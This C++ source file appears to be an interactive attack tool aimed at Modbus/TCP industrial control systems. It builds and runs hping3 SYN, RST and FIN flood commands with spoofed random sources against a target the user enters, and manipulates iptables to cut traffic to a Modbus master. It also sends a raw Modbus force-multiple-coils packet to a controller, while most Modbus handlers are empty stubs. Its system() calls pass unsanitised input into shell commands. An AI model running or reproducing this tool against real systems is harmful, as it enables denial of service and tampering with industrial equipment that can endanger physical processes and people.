#include<iostream>
#include<sstream>
#include<string>
#include<stdlib.h>
#include <modbus.h>
#include <errno.h>


using namespace std;

#ifdef DEBUG
#define print(x) cout<<x
#else
#define print(x) 
#endif

#define TOHEX(x) 0x#x

enum cyberattacks {
     BLOCK=1,
     UNBLOCK,
     SYNFLOOD,
     RST,
     MODBUSPKT,
     FIN //Final enum. Do not modify .Add new values before this. 
};

enum tcpfloodattacktypes {
     FLOOD=1,
     FIXEDDURATION,
     PACKETSPERSEC,
     ENDOFENUM //Final enum value. Do not modify.Add new values before this.
};

enum readModbusTypes {
     READCOILSTATUS=1,
     READINPUTSTATUS,
     READHOLDINGREGS,
     READINPUTREGS,
     REPORTSLAVEID,
     FORCESINGLECOIL,
     FORCEMULTIPLECOILS,
     PRESETSINGLEREG,
     PRESETMULTIREGS,
     READWRITEREGS,
     ENDMODBUSTYPE
};

string readModbusString[ENDMODBUSTYPE-1]= { "Read Single Coil Status",
                                            "Read Input Status ",
                                            "Read Holding Register ",
                                            "Read Input Registers ",
                                            "Report Slave Id. ",
                                            "Force Single Coil Write ",
                                            "Force Multiple Coil Write . ",
                                            "Preset Single Register . ",
                                            "Preset Multiple Registers. ",
                                            "Read Write Registers . "
};
 




string floodAttackString[ENDOFENUM-1]={"FLOOD",
                                       "FIXEDDURATION",
                                       "PACKETSPERSEC",
                                       };

string cyberAttackString[FIN]={  "Block Communication towards Master.",
                                 "Unblock Traffic towards Master.",
                                 "Execute SYN attack towards Modbus Master.",
                                 "Execute a TCP RST attack towards Modbus Master.",
				 "Send a Modbus packet towards Modbus Master. ",
                                 "Execute a TCP FIN attack towards Modbus Master. "
                                };
                                  

//Process Functions
                             
void displayGlobalAttackTypes(void);
void displayOptions(void);
bool validateInput(int inputOption);
void processInput(int inputOption);

//Attack Functions
void inputBlockTrafficParameters(string &ip,string &port);
void blockTraffic(const string ip,const string port);
void unblockTraffic(const string ip, const string port);

// TCP flood functions
void floodAttacks(const string attackType);
tcpfloodattacktypes selectFloodAttack(void);

//Modbus packet generation function
void processModbusInput(readModbusTypes floodOption);
void displayModbusSendPacketOptions(void);
void sendModbusPacket(void);

void modbusReadCoilStatus(void);
void modbusReadInputStatus(void);
void modbusReadHoldingRegisters(void);
void modbusReadInputRegisters(void);
void modbusReportSlaveId(void);
void modbusForceSingleCoil(void);
void modbusForceMultipleCoils(void);
void modbusPresetSingleRegister(void);
void modbusPresetMultipleRegisters(void);
void modbusReadWriteRegisters(void);



//Modbus send and read and write functions defined in modbus library.
//Function prototypes add here for referencing.
/*

READ FUNCTION SET

modbus_read_bits - read many bits
int modbus_read_bits(modbus_t *ctx, int addr, int nb, uint8_t *dest);

modbus_read_input_bits - read many input bits
int modbus_read_input_bits(modbus_t *ctx, int addr, int nb, uint8_t *dest);

modbus_read_registers - read many registers
int modbus_read_registers(modbus_t *ctx, int addr, int nb, uint16_t *dest);

modbus_read_input_registers - read many input registers
int modbus_read_input_registers(modbus_t *ctx, int addr, int nb, uint16_t *dest);

modbus_report_slave_id - returns a description of the controller
int modbus_report_slave_id(modbus_t *ctx, uint8_t *dest);

*/

/*
WRITE FUNCTION SET

modbus_write_bit - write a single bit
int modbus_write_bit(modbus_t *ctx, int addr, int status);

modbus_write_register - write a single register
int modbus_write_register(modbus_t *ctx, int addr, int value);

modbus_write_bits - write many bits
int modbus_write_bits(modbus_t *ctx, int addr, int nb, const uint8_t *src);

modbus_write_registers - write many registers
int modbus_write_registers(modbus_t *ctx, int addr, int nb, const uint16_t *src);

modbus_write_and_read_registers - write and read many registers in a single transaction
int modbus_write_and_read_registers(modbus_t *ctx, int write_addr, int write_nb, const uint16_t *src, int read_addr, int read_nb, const uint16_t *dest);

modbus_send_raw_request - send a raw request
int modbus_send_raw_request(modbus_t *ctx, uint8_t *raw_req, int 'raw_req_length);

modbus_receive_confirmation - receive a confirmation request
int modbus_receive_confirmation(modbus_t *ctx, uint8_t *rsp);

*/

int main(int argv,char *argc[])
{
   
    displayOptions();

    return 0;
}


void displayOptions(void)
{
   displayGlobalAttackTypes();
   int inputOption=0;
   string inputStr="";
   while(1)
   {
      print("Please enter a selection to continue ::");
      getline(cin,inputStr);
      stringstream inputStream(inputStr);
      if( !(inputStream >> inputOption) )
      {
        print("Invalid input"<<endl);
        continue;
      }   
      else
      {
        if(validateInput(inputOption))
        {
           print("Valid input"<<endl);
           processInput(inputOption);
           break;
        }
        else
           print("Invalid input range"<<endl);
      }
   }
  
}

bool validateInput(int inputOption)
{
   bool ret=false;
   if((inputOption < BLOCK) || (inputOption > FIN))
   {
      print("Input Validation Failed"<<endl);
   }
   else
   {
      print("Input Validated"<<endl);
      ret=true;
   }
   return ret;
}
void processInput(int inputOption)
{
    switch(inputOption)
    {
       case BLOCK:
          {
          print("BLOCK TRAFFIC"<<endl);
          string ip="",port="";
          inputBlockTrafficParameters(ip,port);
          blockTraffic(ip,port);
          }
          break;
       case UNBLOCK:
          {
          print("UNBLOCK TRAFFIC"<<endl);
          string ip="",port="";
          inputBlockTrafficParameters(ip,port);
          unblockTraffic(ip,port);
          }
          break;
       case SYNFLOOD:
          print("SYN FLOOD TRAFFIC"<<endl);
          floodAttacks("S");
          break;
       case RST:
          floodAttacks("R");
          print("RST TRAFFIC"<<endl);
          break;
       case MODBUSPKT:
          {
          print("MODBUS PKT send"<<endl);
          displayModbusSendPacketOptions();
          //sendModbusPacket();
          }
          break;
       case FIN:
          floodAttacks("F");
          print("FIN TRAFFIC"<<endl);
          break;
       default:
          break;
    }
}
void inputBlockTrafficParameters(string &ip,string &port)
{
   string inputStr="";
   print("Please enter the IP of master to block ::");
   getline(cin,inputStr);
   {
     stringstream inputStream(inputStr);
     inputStream >> ip;
   }
   inputStr="";
   print("Please enter the TCP port of master to block ::");
   getline(cin,inputStr);
   {
     stringstream inputStream(inputStr);
     inputStream >> port;
   }
   print("Input Ip : "<<ip<<"Input Port "<<port<<endl); 

}
void blockTraffic(const string ip,const string port)
{
    string commandStr="iptables -A OUTPUT -s " + ip + " -p tcp --dport " + port + " -j DROP";
    print(commandStr<<endl);
    system(commandStr.c_str());
    print("The Current firewall rules are as below. "<<endl);
    system("iptables -L -n");
}
void unblockTraffic(const string ip,const string port)
{
    string commandStr="iptables -D OUTPUT -s "+ip+" -p tcp --dport "+port+ " -j DROP";
    print(commandStr<<endl);
    system(commandStr.c_str());
    print("The Current firewall rules are as below. "<<endl);
    system("iptables -L -n");
}
void floodAttacks(const string attackType)
{
    
   tcpfloodattacktypes tcpAttackType = selectFloodAttack();
   print("Flood Attack Type" << tcpAttackType<<endl);
   string packetCount="",packetSize="",port="",targetIP="",packetPerSec="",packetDuration="";
   print("Input the size of each packet to send :: ");
   getline(cin,packetSize); 
   print("Input the ip of the target Master :: ");
   getline(cin,targetIP); 
   print("Input the port of the target Master :: ");
   getline(cin,port); 
   string commandStr="";

   switch(tcpAttackType)
   {
      case FLOOD:
      {
         commandStr= "hping3  -d " 
                      + packetSize + " -" + attackType +
                      " -w 64 -p " + port +
                      " --flood --rand-source " + targetIP;
      }       
        break;
      case FIXEDDURATION:
      {
        
        print("Input the number of seconds to send the packets :: ");
        getline(cin,packetDuration);
        int pD,pPS;
        {
          stringstream inputStream(packetDuration);
          inputStream >> pD;
        }
        print("Input the  number of packets to send per second :: ");
        getline(cin,packetPerSec);
        {
          stringstream inputStream(packetPerSec);
          inputStream >> pPS;
        }
        int totalPkts=pD*pPS;
        packetCount=static_cast<ostringstream *>(&(ostringstream() << (totalPkts)) )->str();
        int reductionFactor=pPS/10;
        if(!reductionFactor)
           reductionFactor=10/pPS;
        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (100000)/reductionFactor)) )->str();
        commandStr= "hping3 -c " + packetCount + 
                      " -d " + packetSize + " -" + attackType +
                      " -w 64 -i "+packetInterval+ " -p " + port +
                      " --rand-source " + targetIP;

      }
        break;
      case PACKETSPERSEC:
      {
        int pPS;
        print("Input the  number of packets to send per second  ::");
        getline(cin,packetPerSec);
        {
          stringstream inputStream(packetPerSec);
          inputStream >> pPS;
        }
        int reductionFactor=pPS/10;
        if(!reductionFactor)
           reductionFactor=10/pPS;

        string packetInterval="u"+(static_cast<ostringstream *>(&(ostringstream() << (100000)/reductionFactor) )->str());
        commandStr= "hping3 -d "  
                      + packetSize +
                      " -S -w 64 -i "+packetInterval+ " -p " + port +
                      " --rand-source " + targetIP;
      }
        break;
      default:
        break;
   }



  print(commandStr<<endl);
  system(commandStr.c_str());
                      
}
tcpfloodattacktypes selectFloodAttack(void)
{
  
  string displayStr="";
  string numstr="";
  int i =FLOOD-1;
  for( ;i<ENDOFENUM-1;i++)
  {
   numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)) )->str();
   displayStr += numstr + "."+floodAttackString[i]+" \n";
  }
  print(displayStr);
  print("Select the type of attack to carry out :: ");
  string inputStr="";
  getline(cin,inputStr);
  stringstream inputStream(inputStr);
  int floodOption=-1;
  inputStream >> floodOption;

  return (tcpfloodattacktypes)floodOption;
}

void displayGlobalAttackTypes(void)
{
  string displayStr="";
  string numstr="";
  int i =0;
  for( ;i<FIN;i++)
  {
    numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)) )->str();
    displayStr += numstr + "."+cyberAttackString[i]+" \n";
  }
  print(displayStr<<endl);

}

void displayModbusSendPacketOptions(void)
{
  string displayStr="";
  string numstr="";
  int i =0;
  for( ;i<ENDMODBUSTYPE-1;i++)
  {
    numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)))->str();
    displayStr += numstr + "." + readModbusString[i] +" \n";
  }
  print(displayStr<<endl);
  print("Select the type of attack to carry out :: ");
  string inputStr="";
  getline(cin,inputStr);
  stringstream inputStream(inputStr);
  int floodOption=-1;
  inputStream >> floodOption;
  processModbusInput((readModbusTypes)floodOption);
}
void  processModbusInput(readModbusTypes floodOption)
{

   switch(floodOption)
   {
     case READCOILSTATUS:
      modbusReadCoilStatus();
      break;
     case READINPUTSTATUS:
      modbusReadInputStatus();
      break;
     case READHOLDINGREGS:
      modbusReadHoldingRegisters();
      break;
     case READINPUTREGS:
      modbusReadInputRegisters();
      break;
     case REPORTSLAVEID:
      modbusReportSlaveId();
      break;
     case FORCESINGLECOIL:
      modbusForceSingleCoil();
      break;
     case FORCEMULTIPLECOILS:
      modbusForceMultipleCoils();
      break;
     case PRESETSINGLEREG:
      modbusPresetSingleRegister();
      break;
     case PRESETMULTIREGS:
      modbusPresetMultipleRegisters();
      break;
     case READWRITEREGS:
      modbusReadWriteRegisters();
      break;
     deafult:
      break;
   }
}
void modbusReadCoilStatus(void)
{
}
void modbusReadInputStatus(void)
{
}
void modbusReadHoldingRegisters(void)
{
}
void modbusReadInputRegisters(void)
{
}
void modbusReportSlaveId(void)
{
}
void modbusForceSingleCoil(void)
{
}
void modbusForceMultipleCoils(void)
{
}
void modbusPresetSingleRegister(void)
{
}
void modbusPresetMultipleRegisters(void)
{
}
void modbusReadWriteRegisters(void)
{
}
void sendModbusPacket(void)
{
  modbus_t *mb;
  modbus_t *mb2;
  uint16_t tab_reg[32];
  std::string modbusSlave1,modbusSlave2;
  int modbusPort1=0,modbusPort2=0;
  string inputStr="";
  print("Enter the Modbus Master IP ::");
  getline(cin,modbusSlave1);
  print("Enter the Modbus Slave port ::");
  getline(cin,inputStr);
  {
   stringstream inputStream(inputStr);
   inputStream >> modbusPort1 ;
   cout<<modbusSlave1<<endl;
  }
   int input ;
   print("Enter the slave id: ");
   std::cin >> input ;
   std::cout << "0x" << std::hex << input << '\n' ;
  //Modbus slave which is a TCP master
  mb = modbus_new_tcp(modbusSlave1.c_str(),modbusPort1);
  if (modbus_connect(mb) == -1) {
               print("Connection failed:" << modbus_strerror(errno));
               modbus_free(mb);
               return;
   }
  /*
  mb2 = modbus_new_tcp(modbusSlave.c_str(),501);
  if (modbus_connect(mb2) == -1) {
               fprintf(stderr, "Connection failed: %s\n", modbus_strerror(errno));
               modbus_free(mb);
               return -1;
   }*/
  /* Read 5 registers from the address 0 */
  //modbus_read_registers(mb, 1, 4, tab_reg);

  //uint8_t raw_req[] = {0x01/*slave id*/, 0x0B/*func code*/, 0x00, 0x01/*ref num*/, 0x00, 0x00/*word count*/ }; 
  //Request slave id;
  //uint8_t raw_req[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
  uint8_t raw_req[] = {input/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
  int req_length = modbus_send_raw_request(mb, raw_req, 8 * sizeof(uint8_t));
  uint8_t raw_req2[] = {0x01/*slave id*/, 0xf/*func code*/,0x03,0xea,0x00,0x02,0x1,0x1}; 
  //req_length = modbus_send_raw_request(mb2, raw_req2, 8 * sizeof(uint8_t));
  //uint8_t raw_req3[] = {0x02/*slave id*/, 0x04/*func code*/,0x00,0x00,0x00,0x03}; 
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  //req_length = modbus_send_raw_request(mb2, raw_req3, 6 * sizeof(uint8_t));
  uint8_t rsp[MODBUS_TCP_MAX_ADU_LENGTH];


  //modbus_receive_confirmation(mb, rsp);
  
  //modbus_close(mb2);
  //modbus_free(mb2);
  modbus_close(mb);
  modbus_free(mb);

}
